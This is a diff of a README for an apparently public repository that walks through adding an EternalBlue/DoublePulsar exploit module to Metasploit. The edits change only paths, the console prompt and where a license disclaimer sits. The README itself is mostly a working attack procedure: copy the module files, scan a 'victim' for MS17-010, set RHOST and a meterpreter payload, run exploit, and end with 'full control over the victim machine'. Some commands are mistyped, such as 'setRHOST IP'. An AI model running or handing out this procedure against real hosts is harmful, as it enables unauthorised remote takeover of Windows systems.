@@ -1,20 +1,18 @@
 # Eternalblue-Doublepulsar-Metasploit
 
-| THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
-
 We need to download and add the Scanner and exploit to Metasploit. Open your Terminal windows and Type following commands.
 
 Move file smb_ms17_010.rb under the folder usr/share/metasploit-framework/modules/auxiliary/scanner/smb
 
 ~~~
-sudo cp smb_ms17_010.rb usr/share/metasploit-framework/modules/auxiliary/scanner/smb
+sudo cp smb_ms17_010.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/smb
 ~~~
 
 And then you should copy Eternal Blue-Doublepulsar.rb and debs to under usr/share/metasploit-framework/modules/exploits/windows/smb
 
 ~~~
-sudo cp eternalblue_doublepulsar.rb usr/share/metasploit-framework/modules/exploits/windows/smb
-sudo cp -r deps usr/share/metasploit-framework/modules/exploits/windows/smb
+sudo cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb
+sudo cp -r deps /usr/share/metasploit-framework/modules/exploits/windows/smb
 ~~~
 
 Now Open the Eternal Blue-Doublepulsar.rb with any Editor and change the path directory for ETERNALBLUE and DOUBLEPULSAR to smb exploit directory usr/share/metasploit-framework/modules/exploits/windows/smb.
@@ -35,7 +33,7 @@ Also Read  NSA Malware “EternalBlue” Successfully Exploit and Port into Micr
 
 Then we should specify the name of the process to be injected, we have specified here as 'explorer.exe'
 
-Then you should launch msfconsole and use the auxiliary scan module  smb_ms17_010.rb.
+Then you should launch msfconsole and use the auxiliary scan module smb_ms17_010.rb.
 ~~~
     dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
        '   dB'                     BBP
@@ -62,31 +60,35 @@ Then you should launch msfconsole and use the auxiliary scan module  smb_ms17_01
 
 Metasploit tip: After running db_nmap, be sure to
 check out the result of hosts and services
+msf6 > 
+~~~
 
-msf > use auxiliary/scanner/smb/smb_ms17_010
-msf > show options
+use the auxiliary scan module smb_ms17_010.rb
+~~~
+msf6 > use auxiliary/scanner/smb/smb_ms17_010
+msf6 > show options
 ~~~
 
 Now you should setup RHOSTS IP which is the Victims Ip address.
 ~~~
-msf > set RHOSTS IP
-msf > run
+msf6 > set RHOSTS IP
+msf6 > run
 ~~~
 
 It will go and check whether the host is vulnerable or not and also display the victim machine details.
 
 Now we can move to the exploit EternalBlue & Double Pulsar                                             
 ~~~
-msf > use exploit/windows/smb/eternalblue_doublepulsar
-msf > set payload windows.x64/meterpreter/bind_tcp
-msf > show options
+msf6 > use exploit/windows/smb/eternalblue_doublepulsar
+msf6 > set payload windows.x64/meterpreter/bind_tcp
+msf6 > show options
 ~~~
 
 Then set a target architecture and then RHOST Victim IP address.
 ~~~
-msf > setRHOST IP
-msf > set targetarchitecture x64
-msf > show options
+msf6 > setRHOST IP
+msf6 > set targetarchitecture x64
+msf6 > show options
 ~~~
 
 And then type exploit and hit enter.
@@ -94,3 +96,5 @@ And then type exploit and hit enter.
 It’s done now we have got the meterpreter session and the vulnerability has been exploited.
 
 Now the system has been exploited successfully and we have full control over the victim machine now.
+
+| THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
